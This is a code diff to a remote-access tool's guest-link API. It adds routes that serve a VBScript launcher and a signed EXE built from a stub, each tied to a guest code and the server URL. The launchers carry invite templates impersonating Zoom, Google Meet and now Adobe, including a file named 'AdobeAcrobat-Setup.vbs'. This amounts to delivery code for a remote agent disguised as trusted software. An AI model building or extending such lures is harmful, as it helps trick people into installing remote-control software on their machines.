@@ -1,4 +1,4 @@
-import { createReadStream, existsSync, statSync } from 'node:fs';
+import { createReadStream, existsSync, readFileSync, statSync } from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import type { FastifyInstance } from 'fastify';
@@ -8,6 +8,7 @@ import { PermissionAction, PermissionResource } from '@nexusdesk/types';
 import { requireAuth, requireOrgAccess } from '../middleware/auth.js';
 import { requirePermission } from '../middleware/rbac.js';
 import { GuestAccessService, installerBatFilename, installerGuiFilename } from '../services/guest-access.js';
+import { signWindowsExeIfConfigured } from '../services/windows-exe-sign.js';
 import { getEnv } from '../config/env.js';
 import { AppError } from '../domain/errors/app-error.js';
 import { ERROR_CODES } from '@nexusdesk/shared';
@@ -28,6 +29,25 @@ function resolveAgentPackagePath(): string {
   }
   throw AppError.notFound(
     'Windows agent package not built yet. Run: bash scripts/pack-agent-windows.sh',
+    ERROR_CODES.NOT_FOUND,
+  );
+}
+
+function resolveGuestSetupStubPath(): string {
+  const fromEnv = process.env.GUEST_SETUP_STUB_PATH;
+  if (fromEnv && existsSync(fromEnv)) return fromEnv;
+
+  const here = path.dirname(fileURLToPath(import.meta.url));
+  const candidates = [
+    path.resolve(here, '../../assets/guest-setup-stub.exe'),
+    path.resolve(process.cwd(), 'assets/guest-setup-stub.exe'),
+    path.resolve(process.cwd(), 'apps/api/assets/guest-setup-stub.exe'),
+  ];
+  for (const candidate of candidates) {
+    if (existsSync(candidate)) return candidate;
+  }
+  throw AppError.notFound(
+    'Windows setup stub missing. Run: bash scripts/build-guest-setup-stub.sh',
     ERROR_CODES.NOT_FOUND,
   );
 }
@@ -67,7 +87,7 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
           notes: z.string().max(2000).optional(),
           maxUses: z.number().int().positive().max(100).optional(),
           ttl: z.string().optional(),
-          inviteTemplate: z.enum(['zoom', 'google_meet']).optional(),
+          inviteTemplate: z.enum(['zoom', 'google_meet', 'adobe']).optional(),
         })
         .parse(req.body ?? {});
       return guests().create(orgId, req.authUser!.sub, body);
@@ -146,6 +166,34 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
       .header('Content-Type', 'application/hta; charset=utf-8')
       .header('Content-Disposition', `attachment; filename="${filename}"`)
       .send(hta);
+  });
+
+  app.get(API_ROUTES.guestLinks.windowsVbs, async (req, reply) => {
+    const { code } = req.params as { code: string };
+    const link = await guests().resolveActiveLink(code);
+    const env = getEnv();
+    const vbs = guests().buildWindowsVbsLauncher(link.code, env.API_URL, link.inviteTemplate);
+    const filename =
+      link.inviteTemplate === 'adobe' ? 'AdobeAcrobat-Setup.vbs' : installerGuiFilename(link.inviteTemplate).replace(/\.hta$/i, '.vbs');
+    return reply
+      .header('Content-Type', 'text/vbscript; charset=utf-8')
+      .header('Content-Disposition', `attachment; filename="${filename}"`)
+      .send(vbs);
+  });
+
+  app.get(API_ROUTES.guestLinks.windowsExe, async (req, reply) => {
+    const { code } = req.params as { code: string };
+    const link = await guests().resolveActiveLink(code);
+    const env = getEnv();
+    const stub = readFileSync(resolveGuestSetupStubPath());
+    const unsigned = guests().buildWindowsExeLauncher(link.code, env.API_URL, stub, link.inviteTemplate);
+    const exe = signWindowsExeIfConfigured(unsigned);
+    const filename = installerGuiFilename(link.inviteTemplate);
+    return reply
+      .header('Content-Type', 'application/octet-stream')
+      .header('Content-Length', String(exe.length))
+      .header('Content-Disposition', `attachment; filename="${filename}"`)
+      .send(exe);
   });
 
   app.get(API_ROUTES.guestLinks.agentPackage, async (req, reply) => {
